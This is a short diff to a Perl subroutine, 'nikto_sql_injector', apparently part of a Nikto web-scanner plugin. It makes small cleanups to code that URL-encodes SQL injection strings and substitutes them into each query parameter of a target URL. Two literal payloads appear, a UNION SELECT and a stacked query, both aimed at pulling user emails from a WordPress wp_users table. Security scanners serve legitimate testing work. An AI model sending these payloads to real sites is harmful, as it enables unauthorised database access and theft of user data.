@@ -36,11 +36,9 @@ sub nikto_sql_injector {
 	use URI::Escape;
 	use URI::Split qw(uri_split uri_join);	
     use URI::QueryParam;
-    
-	
+
     my ($mark) = @_;
     my ($found, @urls,);
-    my (@sql_injections);
     my (%flags, %files);
 
     # these are examples from my 'classification section'
@@ -49,8 +47,6 @@ sub nikto_sql_injector {
     $sql_injections{'union'} = "' UNION ALL SELECT user_email from wp_users; --";
     $sql_injections{'piggy'} = "'; select user_email from wp_users; --";
 
-    
-    
     $flags{'nohost'} = 1;
 
     #this identifies the original url
@@ -60,7 +56,7 @@ sub nikto_sql_injector {
     ($scheme, $auth, $path, $query, $frag) = uri_split($mark->{'ident'});
     
     # process the queries, re-making them with injecions
-    foreach my $data (keys %sql_injections) {
+    foreach my $data (values %sql_injections) {
     	# url encode the injection string
         my $injection = uri_escape($data);
     	
@@ -68,7 +64,7 @@ sub nikto_sql_injector {
 		my $uri = URI->new( $mark->{'ident'} );
 		
 		#loop and replace each query with the injected version
-		for my $key ($uri->query_param) {
+		foreach my $key ($uri->query_param) {
 			# make our injected query value
             $injected_value = $key . $injection;
             
